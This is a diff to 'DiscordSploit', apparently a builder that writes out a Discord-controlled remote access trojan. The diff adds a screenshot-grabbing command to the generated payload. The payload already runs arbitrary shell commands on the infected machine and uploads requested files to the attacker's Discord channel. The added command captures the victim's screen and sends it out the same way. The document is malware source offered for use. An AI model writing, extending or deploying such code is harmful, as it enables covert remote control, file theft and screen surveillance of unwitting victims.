@@ -7,7 +7,7 @@ LOGO = ("""
             | |) | (_-</ _/ _ \ '_/ _` \__ \ '_ \ / _ \ |  _|
             |___/|_/__/\__\___/_| \__,_|___/ .__/_\___/_|\__|
                                            |_|               
-            DiscordSploit Version 0.1
+            DiscordSploit Version 0.2
             By sarsatra https://github.com/sarsatra/DiscordSploit
             'help' for help
 """)
@@ -48,6 +48,7 @@ import discord
 import subprocess
 from discord.ext import commands
 from discord.ext.commands import bot
+from PIL import ImageGrab
 bot = commands.Bot(command_prefix='#', help_command=None)
 @bot.event
 async def on_ready():
@@ -55,7 +56,8 @@ async def on_ready():
 @bot.command(name='help')
 async def help(ctx):
     await ctx.send('''`cmd       Executes commands in shell
-download  Downloads a file 
+download  Downloads a file
+sscreenshot Takes a screenshot
 help      Shows this message`''')
 @bot.command(pass_context=True)
 async def cmd(ctx, *args):
@@ -66,6 +68,14 @@ async def cmd(ctx, *args):
 async def download(ctx, *args):
     joined = ' '.join(args)
     await ctx.send(joined , file=discord.File(joined))
+@bot.command(pass_context=True)
+async def sscreenshot(ctx):
+    ss = ImageGrab.grab()
+    img_byte = io.BytesIO()
+    ss = ss.crop()
+    ss.save(img_byte, format='PNG')
+    img_byte.seek(0)
+    await ctx.send("screenshot.png", file=discord.File(fp=img_byte, filename='screenshot.png'))
 bot.run('{token}')
             """)
        
